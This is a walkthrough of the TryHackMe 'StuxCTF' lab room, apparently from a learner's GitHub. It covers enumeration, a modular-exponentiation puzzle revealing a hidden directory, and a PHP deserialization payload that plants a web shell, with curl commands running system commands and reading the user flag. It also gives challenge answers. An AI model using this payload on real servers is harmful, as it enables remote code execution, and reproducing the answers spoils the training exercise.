<h1 align="center"> $$\textcolor{#3bd62d}{\textnormal{StuxCTF}}$$</h1>
<p align="center">May 25, 2025<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m excited to join you on this adventure, part of my $$\textcolor{#FF69B4}{\textbf{384}}$$-day-streak in  <a href="https://tryhackme.com">TryHackMe</a><br>
Crypto, serealization, priv scalation and more ...! Access it clicking <a href="https://tryhackme.com/room/stuxctf"</a>here.<br><br>
<img width="1000px" src=""></p>

<h1 align="center">Read my walkthrough in Medium clicking <a href="https://medium.com/@RosanaFS/apt28-in-the-snare-tryhackme-walkthrough-blue-team-advanced-persistent-threats-apts-ca5b1eafcb29"> APT28 in the Snare</a>.</h1>

<br>
<br>



<h2>Task 1 . StuxCTF</h2>

<br>

<h3 align="left"> $$\textcolor{#f00c17}{\textnormal{Answer the questions below}}$$ </h3>


> 1.3. <em>What is the hidden directory?</em> Hint : <em>  g ^ a mod p, g ^ b mod p, g ^ C mod p | first 128 characters ... </em><br><a id='1.3'></a>
>> <strong><code>47315028937264895539131328176684350732577039984023005189203993885687328953804202704977050807800832928198526567069446044422855055</code></strong><br>
<p></p>

<br>

<p>Used <code>nmap</code> and discovered 2 ports open.</p>

<br>

![image](https://github.com/user-attachments/assets/e33dbc8a-bcdd-4bd0-9a6d-e521737c34ed)

<br>

<p>Added domain name and Target IP to /etc/hosts.</p>

<br>

![image](https://github.com/user-attachments/assets/2022d90c-7858-41f4-9c58-df9f679e0333)

<br>

<p>Checked robots.txt´s content.</p>

<br>

![image](https://github.com/user-attachments/assets/de998879-88bb-49f6-a8d2-e12cb55f1956)

<br>

<p>Tried the guidance of robots.txt and received a <code>404</code>.</p>

<br>

![image](https://github.com/user-attachments/assets/21453d39-2424-46a7-81b4-e5c0a5fb0727)

<br>

<p>Used <code>curl</code> for the thrid time ... now to get <code>http://TargetIP/</code> content.</p>

<br>

![image](https://github.com/user-attachments/assets/04d6ff35-9b35-4c06-b96b-e5efa7fd117d)


<br>

```bash
p: 9975298661930085086019708402870402191114171745913160469454315876556947370642799226714405016920875594030192024506376929926694545081888689821796050434591251;
		g: 7;
		a: 330;
		b: 450;
		g^c: 6091917800833598741530924081762225477418277010142022622731688158297759621329407070985497917078988781448889947074350694220209769840915705739528359582454617;
		-->
		is blank....
```

<br>

<p>There is a hint in the one of the questions of the CTF:<br><br>
What is the hidden directory? <code>HINT: g ^ a mod p, g ^ b mod p, g ^ C mod p</code>.first 128 characters ... </p>

<br>

<p>Writed a script and ran it.</p>

<br>

![image](https://github.com/user-attachments/assets/0bdeb127-37b2-47a3-9e31-0421f81ce466)

<br>


> 1.1. <em>user.txt </em><br><a id='1.1'></a>
>> <strong><code>0b6044b7807dd100b9e30f1bd09db53f</code></strong><br>
<p></p>


<br>

<p>Navigated to <code>http://stuxctf.thm/47315028937264895539131328176684350732577039984023005189203993885687328953804202704977050807800832928198526567069446044422855055/</code></p>

<br>

![image](https://github.com/user-attachments/assets/71f83991-deaf-46c4-b1b0-3e7d6e2f42ae)


<br>

![image](https://github.com/user-attachments/assets/1106ab3c-ed9d-4983-bed1-668b60abecbc)

<br>

<p>Launched Burp Suite and enabled FoxyProxy.</p>

<br>

<p>Sent to repeater adding <code>/?file=index.php</code>.</p>

<br>

![image](https://github.com/user-attachments/assets/a88c9221-f0e4-4a6f-8d16-afc301689368)


<br>

<p>Used CyberChef.</p>

<br>

![image](https://github.com/user-attachments/assets/a27b512c-7eb8-4733-960f-be6d28062e0f)

<br>

![image](https://github.com/user-attachments/assets/5d25fd2e-658e-45f4-af0a-e0c99abe7108)

<br>


```bash
<br />
error_reporting(0);<br />
class file {<br />
        public $file = "dump.txt";<br />
        public $data = "dump test";<br />
        function __destruct(){<br />
                file_put_contents($this->file, $this->data);<br />
        }<br />
}<br />
<br />
<br />
$file_name = $_GET['file'];<br />
if(isset($file_name) && !file_exists($file_name)){<br />
        echo "File no Exist!";<br />
}<br />
<br />
if($file_name=="index.php"){<br />
        $content = file_get_contents($file_name);<br />
        $tags = array("", "");<br />
        echo bin2hex(strrev(base64_encode(nl2br(str_replace($tags, "", $content)))));<br />
}<br />
unserialize(file_get_contents($file_name));<br />
<br />
<!DOCTYPE html><br />
    <head><br />
        <title>StuxCTF</title><br />
	<meta charset="UTF-8"><br />
        <meta name="viewport" content="width=device-width, initial-scale=1"><br />
        <link rel="stylesheet" href="assets/css/bootstrap.min.css" /><br />
        <link rel="stylesheet" href="assets/css/style.css" /><br />
    </head><br />
        <body><br />
        <nav class="navbar navbar-default navbar-fixed-top"><br />
          <div class="container"><br />
            <div class="navbar-header"><br />
              <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar" aria-expanded="false" aria-controls="navbar"><br />
                <span class="sr-only">Toggle navigation</span><br />
              </button><br />
              <a class="navbar-brand" href="index.php">Home</a><br />
            </div><br />
          </div><br />
        </nav><br />
        <!-- hint: /?file= --><br />
        <div class="container"><br />
            <div class="jumbotron"><br />
				<center><br />
					<h1>Follow the white rabbit..</h1><br />
				</center><br />
            </div><br />
        </div>            <br />
        <script src="assets/js/jquery-1.11.3.min.js"></script><br />
        <script src="assets/js/bootstrap.min.js"></script><br />
    </body><br />
</html><br />

```

<br>

<br>

<p>It is a php code.</p>



<p>O:4:"file":2:{s:4:"file";s:7:"rev.php";s:4:"data";s:28:"<?php system($_GET["cmd"])?>";}</p>


![image](https://github.com/user-attachments/assets/02004eb3-ee7e-477b-b064-953ac4430832)

<br>

<br>

![image](https://github.com/user-attachments/assets/fdc8a534-6517-42a8-a826-e1c0ffb7dbd4)

<br>

![image](https://github.com/user-attachments/assets/abe93ff2-d22b-4f15-bc50-275ea52b0502)


<br>

```bash
:~/StuxCTF# curl -s http://stuxctf.thm//4731502893726489553913132817668435073257703root@ip-10-10-17-38:~/StuxCTF# curl -s http://stuxctf.thm//47315028937264895539131328176684350732577039984023005189203993885687328953804202704977050807800832928198526567069446044422855055/rev.php --get --data-urlencode "cmd=id"
uid=33(www-data) gid=33(www-data) groups=33(www-data)
:~/StuxCTF# curl -s http://stuxctf.thm//47315028937264895539131328176684350732577039984023005189203993885687328953804202704977050807800832928198526567069446044422855055/rev.php --get --data-urlencode "cmd=pwd"
/var/www/html/47315028937264895539131328176684350732577039984023005189203993885687328953804202704977050807800832928198526567069446044422855055
:~/StuxCTF# curl -s http://stuxctf.thm//47315028937264895539131328176684350732577039984023005189203993885687328953804202704977050807800832928198526567069446044422855055/rev.php --get --data-urlencode "cmd=ls"
assets
index.php
rev.php
shell.php
:~/StuxCTF# curl -s http://stuxctf.thm//47315028937264895539131328176684350732577039984023005189203993885687328953804202704977050807800832928198526567069446044422855055/rev.php --get --data-urlencode "cmd=ls /home"
grecia
:~/StuxCTF# curl -s http://stuxctf.thm//47315028937264895539131328176684350732577039984023005189203993885687328953804202704977050807800832928198526567069446044422855055/rev.php --get --data-urlencode "cmd=ls /home/grecia"
user.txt
:~/StuxCTF# curl -s http://stuxctf.thm//47315028937264895539131328176684350732577039984023005189203993885687328953804202704977050807800832928198526567069446044422855055/rev.php --get --data-urlencode "cmd=cat /home/grecia/user.txt"
0b6044b7807dd100b9e30f1bd09db53f
:~/StuxCTF# 

```

<br>
<br>


> 1.2. <em>root.txt </em><br><a id='1.2'></a>
>> <strong><code>______________f</code></strong><br>
<p></p>


<br>




<br>


<h1 align="center"> $$\textcolor{#3bd62d}{\textnormal{Room Completed}}$$</h1>
<p align="center"> <img width="1000px" src=""><br>
                   <img width="1000px" src=""></p>
<h1 align="center"> $$\textcolor{#3bd62d}{\textnormal{My TryHackMe Journey}}$$</h1>


<div align="center">

| Date<br>          |  Streak<br>|   All Time<br>Global   |   All Time<br>Brazil |  Monthly<br>Global   |  Monthly<br>Brazil   |  SHOGUN<br>points  |   Rooms<br>completed  |  Badges<br> |
| :---------------: | :--------: | :--------------------: | :------------------: | :------------------: | :------------------: | :----------------: | :-------------------: | :---------: |
| May 25, 2025      |     384    |          213ʳᵈ         |            4ᵗʰ       |        161ˢᵗ         |           3ʳᵈ        |       104,213      |             741       |    62       |

</div>

<p align="center"> Global All Time: 221ˢᵗ <br><img width="300px" src="" alt="Your Image Badge"><br>
                                              <img width="1000px" src=""><br><br>
                   Brazil All Time:   4ᵗʰ<br><img width="1000px" src=""><br><br>
                   Global monthly:   161ˢᵗ<br><img width="1000px" src=""><br><br>
                   Brazil monthly:   3ʳᵈ<br><img width="1000px" src=""><br><br></p>

<h1 align="center"> $$\textcolor{#3bd62d}{\textnormal{Thanks for coming!}}$$</h1>
<p align="center">Follow me on <a href="https://medium.com/@RosanaFS">Medium</a>, here on <a href="https://github.com/RosanaFSS/TryHackMe">GitHub</a>, and on <a href="https://www.linkedin.com/in/rosanafssantos/">LinkedIN</a>.</p> 
<br>
<h1 align="center">Thank you very much <a href="https://tryhackme.com/p/stuxnet">stuxnet</a> for developinng this experience so that I could sharpen my skills!</h1>
